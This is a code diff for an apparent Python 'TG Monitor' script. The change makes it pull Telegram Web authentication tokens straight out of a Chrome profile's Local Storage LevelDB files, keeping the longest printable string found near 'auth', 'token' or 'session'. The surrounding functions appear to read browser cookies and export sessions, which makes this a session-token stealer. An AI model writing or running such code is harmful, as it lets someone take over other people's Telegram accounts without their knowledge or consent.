@@ -82,27 +82,43 @@ def get_telegram_local_storage():
     return storage
 
 
-def get_telegram_token(cookies):
-    """Extract Telegram auth token from cookies"""
-    # Look for any Telegram-related cookie that might be the token
-    for cookie in cookies:
-        domain = cookie.get("domain", "").lower()
-        name = cookie.get("name", "").lower()
-        value = cookie.get("value", "")
+def get_telegram_token():
+    """Extract Telegram auth token from LocalStorage"""
+    try:
+        # Telegram Web stores auth data in LocalStorage
+        ls_path = CHROME_PROFILE / "Local Storage" / "leveldb"
         
-        # Telegram Web stores auth in various places
-        if "telegram" in domain and value and len(value) > 50:
-            # Return the longest value (likely the token)
-            return value
-    
-    # If no long value found, return any Telegram cookie
-    for cookie in cookies:
-        domain = cookie.get("domain", "").lower()
-        value = cookie.get("value", "")
-        if "telegram" in domain and value:
-            return value
-    
-    return None
+        if not ls_path.exists():
+            return None
+        
+        # Read all leveldb files to find auth data
+        for db_file in ls_path.glob("*.ldb"):
+            try:
+                with open(db_file, 'rb') as f:
+                    content = f.read()
+                    # Look for auth-related strings
+                    if b'auth' in content or b'token' in content or b'session' in content:
+                        # Extract readable strings
+                        strings = []
+                        current = b''
+                        for byte in content:
+                            if 32 <= byte <= 126:  # Printable ASCII
+                                current += bytes([byte])
+                            else:
+                                if len(current) > 50:
+                                    strings.append(current.decode('ascii', errors='ignore'))
+                                current = b''
+                        
+                        # Return longest string (likely the token)
+                        if strings:
+                            return max(strings, key=len)
+            except:
+                pass
+        
+        return None
+    except Exception as e:
+        print(f"[TG Monitor] Token extraction error: {e}", flush=True)
+        return None
 
 
 def export_session():
@@ -180,7 +196,7 @@ def main():
             check_count += 1
             
             cookies = get_chrome_cookies()
-            token = get_telegram_token(cookies)
+            token = get_telegram_token()
             
             # Check Local Storage for Telegram auth
             ls_path = CHROME_PROFILE / "Local Storage" / "leveldb"
